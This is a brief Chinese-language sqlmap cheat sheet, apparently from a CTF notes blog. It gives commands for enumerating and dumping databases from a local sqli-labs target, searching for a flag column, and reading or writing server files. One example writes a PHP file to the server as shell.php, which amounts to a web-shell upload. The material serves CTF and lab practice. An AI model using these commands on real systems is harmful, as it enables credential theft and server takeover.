# 基本语法：

```javascript
--dbs      #数据库
--tables -D"tets"  #显示test数据库中的表
--column -T"table_name" -D"database_name" #显示表结构
--dump -C"column_name" -T"table_name" -D"database_naem" #显示指定字段里的内容
--dump -T"table_name" -D"database_name" #显示表的所有内容
```



列如：

```javascript
sqlmap -u"http://192.168.100.176/vuln/sqli-labs/Less-1/?id=1"
 --dump -C"password,username" -T"users" -D"security"
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/神器使用/sqlmap/images/4BFF136AB7DB496981B0425376F03845clipboard.png)



# 从数据库搜索指定字段

--search:搜索指定字段（在ctf中很有用，直接搜索flag)

```javascript
sqlmap -u"http://127.0.0.1?id=1" -D"securty" --search -C"flag""
```



# 文件读写：

--file-read=RFILE  从后端的数据库管理系统文件系统读取文件（物理路径）

--file-write=WFILE 编辑后端的数据库管理系统上的本地文件

--file-dest=DFILE  后端的数据库管理系统写入文件的绝对路径



示例：

```javascript
sqlmap -r"bp.txt" -p"uname" --file-write='/root/桌面/CTF/1.php' 
--file-dest="H:\WWW\vuln\sqli-labs\Less-11\shell.php"
```

将本地的1.php文件写入到服务器的shell.php文件内。































